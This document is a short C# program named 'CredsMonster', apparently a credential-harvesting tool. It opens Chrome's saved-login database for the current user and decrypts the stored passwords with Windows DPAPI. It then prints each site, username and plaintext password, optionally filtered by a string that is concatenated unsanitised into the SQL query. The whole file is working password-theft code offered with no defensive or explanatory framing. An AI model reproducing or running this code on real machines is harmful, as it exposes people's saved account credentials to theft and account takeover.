using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Security;

namespace CredsMonster
{
    class Program
    {
        static void Main(string[] args)
        {
            string filter = "";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
            string db = "Data Source=" + path + ";pooling=false";
            if (args.Length >= 1)
            {
                filter = args[0];
                Console.WriteLine("Filter is {0}", filter);
            }

            Console.WriteLine("DS is located at {0}", path);

            SQLiteConnection conn = new System.Data.SQLite.SQLiteConnection(db);
            SQLiteCommand cmd = conn.CreateCommand();

            if (filter.Equals(""))
            {
                cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins";
            }
            else
            {
                cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins WHERE action_url LIKE '%" + filter + "%'";
            }

            conn.Open();
            SQLiteDataReader result = cmd.ExecuteReader();

            while (result.Read())
            {
                byte[] data = (byte[])result[2];
                byte[] plaintext = System.Security.Cryptography.ProtectedData.Unprotect(data, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                Console.WriteLine("{0}:{1}={2}", result.GetString(0), result.GetString(1), Encoding.ASCII.GetString(plaintext));
                Console.Read();
            }

            conn.Close();
            
        }
    }
}

